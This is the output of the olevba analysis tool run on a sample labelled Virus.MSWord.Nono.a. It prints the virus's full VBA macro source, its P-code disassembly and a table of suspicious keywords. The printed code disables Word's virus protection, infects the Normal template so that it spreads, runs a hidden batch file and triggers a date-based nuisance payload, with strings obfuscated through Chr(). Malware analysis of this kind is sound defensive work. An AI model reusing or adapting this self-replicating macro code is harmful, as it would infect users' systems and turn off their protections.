olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nono.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nono.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Hard.bas 
in file: ./Virus.MSWord.Nono.a - OLE stream: 'Macros/VBA/Hard'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetShortPathName Lib "kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long
Sub AutoOpen()
On Error Resume Next
cr = vbCr
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49), Object:=wdOrganizerObjectProjectItems
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Chr(118) + Chr(49) + Chr(49), Object:=wdOrganizerObjectProjectItems
If Minute(Now) = 30 And Second(Now) >= 16 Then Call a
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines > 0 Then
Application.Run MacroName:="Normal.ThisDocument.AutoOpen"
End
End If
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ActiveDocument.VBProject.VBComponents.Item(2).Name, NewName:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents.Item(Application.UserInitials).Export "c:\" + Application.UserInitials
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" + cr + _
"On Error Resume Next" + cr + _
"If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then" + cr + _
"If Dir(""c:\"" + Application.UserInitials) <> Application.UserInitials Then" + cr + "ActiveDocument.VBProject.VBComponents.Item(x).Export ""c:\"" + Application.UserInitials" + cr + _
"End If" + cr + "Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems" + cr + _
"End If" + cr + "Out:" + cr + "End Sub" + cr + "Sub AutoClose()" + cr + "On Error Resume Next" + cr + _
"ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)" + cr + "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName" + cr + _
"End Sub" + cr + "Sub ToolsMacro()" + cr + "End Sub" + cr + "Sub ViewVBCode()" + cr + "End Sub" + cr + _
"Sub Autoexec()" + cr + "If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then" + cr + _
"Open ""c:\v1.bas"" For Output As 1" + cr + "Print #1, ""Attribute VB_Name = """"v1""""" + cr + _
"Print #1, ""Sub AutoOpen()""" + cr + "Print #1, ""ActiveDocument.VBProject.VBComponents.Import (""""c:\"""" + Application.UserInitials)""" + cr + _
"Print #1, ""End Sub""" + cr + "Close 1" + cr + "NormalTemplate.VBProject.VBComponents.Import (""c:\v1.bas"")" + cr + "End If" + cr + "End Sub")
NormalTemplate.Save
Call B
End Sub
Function a()
If Day(Now) = 10 Then
an = MsgBox(Chr(82) + Chr(117) + Chr(110) + Chr(32) + Chr(65) + Chr(110) + Chr(105) + Chr(109) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(63), vbQuestion + vbYesNo, Chr(72) + Chr(97) + Chr(114) + Chr(100) + Chr(46) + Chr(80) + Chr(111) + Chr(112) + Chr(112) + Chr(121))
If an = vbYes Then Call a
If an = vbNo Then GoTo nono
End If
Set cb = New DataObject
oi = Chr(32)
Application.EnableCancelKey = wdCancelDisabled
S = Chr(86) + Chr(105) + Chr(99) + Chr(111) + Chr(100) + Chr(105) + Chr(110) + Chr(69) + Chr(83) + oi + oi
Application.Caption = oi + oi + S + Chr(47) + Chr(84) + Chr(78) + Chr(78) + oi + Chr(47) + Chr(67) + Chr(66) + oi + oi
For an = 1 To 3
For x = 1 To 15
yy = S + yy
Application.StatusBar = yy
Call Delay
Next x
For t = 1 To 12
yy = S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next t
For u = 1 To 10
yy = vbTab + S + vbTab + yy
Application.StatusBar = yy
Call Delay
Next u
Next an
yy = S + oi + Chr(45) + Chr(45) + Chr(45) + Chr(62) + oi + yy
For i = 1 To 115
yy = oi + yy
Application.StatusBar = yy
For o = 1 To 400000
Next o
Next i
Application.StatusBar = Chr(62) + Chr(58) + Chr(45) + Chr(41) + yy
Application.Caption = Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName
cb.SetText cr & Application.Application & oi & Chr(76) & Chr(111) & Chr(118) & Chr(101) & Chr(115) & oi & Application.UserName & cr & cr
cb.PutInClipboard
Selection.Paste
nono:
End Function
Function Delay()
For o = 1 To 1000000
Next o
End Function
Function spn(sp As String) As String
    Dim sb As String
    Dim lb As Long
    sb = Space(200)
    lb = GetShortPathName(sp, sb, Len(sb))
    If lb > 0 Then spn = Left(sb, lb)
End Function
Function B()
    oi = Chr(32)
    If Application.System.OperatingSystem = "Windows" Then
    SUPS = spn(Application.StartupPath)
    NTFP = spn(NormalTemplate.FullName)
    ffrr = SUPS + Chr(92) + NormalTemplate
    Open Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116) For Output As 1
    Print #1, Chr(99) + Chr(111) + Chr(112) + Chr(121) + oi & NTFP & oi & ffrr & oi + Chr(47) + Chr(121)
    Close 1
    Shell Chr(99) + Chr(58) + Chr(92) & Application.SpecialMode & Chr(46) + Chr(98) + Chr(97) + Chr(116), vbHide
    End If
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Nono.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 955 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Macros/VBA/Hard - 8571 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetShortPathName Lib "kernel32" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long)
' Line #1:
' 	FuncDefn (Sub AutoOpen())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld vbCr 
' 	St cr 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #7:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #8:
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	LitDI2 0x0010 
' 	Ge 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) a 0x0000 
' 	EndIf 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #10:
' 	LitStr 0x001C "Normal.ThisDocument.AutoOpen"
' 	ParamNamed MacroName 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #11:
' 	End 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld Application 
' 	MemLd UserInitials 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Add 
' 	Ld Application 
' 	MemLd UserInitials 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #15:
' 	LineCont 0x002C 13 00 00 00 17 00 00 00 1B 00 00 00 23 00 00 00 2B 00 00 00 3F 00 00 00 47 00 00 00 5B 00 00 00 63 00 00 00 6B 00 00 00 73 00 00 00
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld cr 
' 	Add 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0055 "If ActiveDocument.VBProject.VBComponents.Item(2).Name = Application.UserInitials Then"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0049 "If Dir("c:\" + Application.UserInitials) <> Application.UserInitials Then"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0055 "ActiveDocument.VBProject.VBComponents.Item(x).Export "c:\" + Application.UserInitials"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0082 "Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Application.UserInitials, Object:=wdOrganizerObjectProjectItems"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0004 "Out:"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x004F "ActiveDocument.VBProject.VBComponents.Import ("c:\" + Application.UserInitials)"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0037 "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x000E "Sub Autoexec()"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0051 "If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0020 "Open "c:\v1.bas" For Output As 1"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0025 "Print #1, "Attribute VB_Name = ""v1"""
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x001A "Print #1, "Sub AutoOpen()""
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x005D "Print #1, "ActiveDocument.VBProject.VBComponents.Import (""c:\"" + Application.UserInitials)""
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0013 "Print #1, "End Sub""
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0007 "Close 1"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x003A "NormalTemplate.VBProject.VBComponents.Import ("c:\v1.bas")"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #16:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #17:
' 	ArgsCall (Call) B 0x0000 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Function a())
' Line #20:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbQuestion 
' 	Ld vbYesNo 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd MsgBox 0x0003 
' 	St an 
' Line #22:
' 	Ld an 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) a 0x0000 
' 	EndIf 
' Line #23:
' 	Ld an 
' 	Ld vbNo 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nono 
' 	EndIf 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	SetStmt 
' 	New DataObject
' 	Set cb 
' Line #26:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	St oi 
' Line #27:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #28:
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld oi 
' 	Add 
' 	Ld oi 
' 	Add 
' 	St S 
' Line #29:
' 	Ld oi 
' 	Ld oi 
' 	Add 
' 	Ld S 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld oi 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld oi 
' 	Add 
' 	Ld oi 
' 	Add 
' 	Ld Application 
' 	MemSt Caption 
' Line #30:
' 	StartForVariable 
' 	Ld an 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #31:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #32:
' 	Ld S 
' 	Ld yy 
' 	Add 
' 	St yy 
' Line #33:
' 	Ld yy 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #34:
' 	ArgsCall (Call) Delay 0x0000 
' Line #35:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000C 
' 	For 
' Line #37:
' 	Ld S 
' 	Ld vbTab 
' 	Add 
' 	Ld yy 
' 	Add 
' 	St yy 
' Line #38:
' 	Ld yy 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #39:
' 	ArgsCall (Call) Delay 0x0000 
' Line #40:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	StartForVariable 
' 	Ld u 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #42:
' 	Ld vbTab 
' 	Ld S 
' 	Add 
' 	Ld vbTab 
' 	Add 
' 	Ld yy 
' 	Add 
' 	St yy 
' Line #43:
' 	Ld yy 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #44:
' 	ArgsCall (Call) Delay 0x0000 
' Line #45:
' 	StartForVariable 
' 	Ld u 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	StartForVariable 
' 	Ld an 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	Ld S 
' 	Ld oi 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld oi 
' 	Add 
' 	Ld yy 
' 	Add 
' 	St yy 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0073 
' 	For 
' Line #49:
' 	Ld oi 
' 	Ld yy 
' 	Add 
' 	St yy 
' Line #50:
' 	Ld yy 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #51:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #52:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld yy 
' 	Add 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #55:
' 	Ld Application 
' 	MemLd Application 
' 	Ld oi 
' 	Concat 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld oi 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Application 
' 	MemSt Caption 
' Line #56:
' 	Ld cr 
' 	Ld Application 
' 	MemLd Application 
' 	Concat 
' 	Ld oi 
' 	Concat 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld oi 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld cr 
' 	Concat 
' 	Ld cr 
' 	Concat 
' 	Ld cb 
' 	ArgsMemCall SetText 0x0001 
' Line #57:
' 	Ld cb 
' 	ArgsMemCall PutInClipboard 0x0000 
' Line #58:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #59:
' 	Label nono 
' Line #60:
' 	EndFunc 
' Line #61:
' 	FuncDefn (Function Delay())
' Line #62:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x4240 0x000F 
' 	For 
' Line #63:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	EndFunc 
' Line #65:
' 	FuncDefn (Function spn(sp As String) As String)
' Line #66:
' 	Dim 
' 	VarDefn sb (As String)
' Line #67:
' 	Dim 
' 	VarDefn lb (As Long)
' Line #68:
' 	LitDI2 0x00C8 
' 	ArgsLd Space 0x0001 
' 	St sb 
' Line #69:
' 	Ld sp 
' 	Ld sb 
' 	Ld sb 
' 	FnLen 
' 	ArgsLd GetShortPathName 0x0003 
' 	St lb 
' Line #70:
' 	Ld lb 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld sb 
' 	Ld lb 
' 	ArgsLd LBound 0x0002 
' 	St spn 
' 	EndIf 
' Line #71:
' 	EndFunc 
' Line #72:
' 	FuncDefn (Function B())
' Line #73:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	St oi 
' Line #74:
' 	Ld Application 
' 	MemLd System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	IfBlock 
' Line #75:
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsLd spn 0x0001 
' 	St SUPS 
' Line #76:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd spn 0x0001 
' 	St NTFP 
' Line #77:
' 	Ld SUPS 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld NormalTemplate 
' 	Add 
' 	St ffrr 
' Line #78:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Application 
' 	MemLd SpecialMode 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld oi 
' 	Add 
' 	Ld NTFP 
' 	Concat 
' 	Ld oi 
' 	Concat 
' 	Ld ffrr 
' 	Concat 
' 	Ld oi 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #81:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Application 
' 	MemLd SpecialMode 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

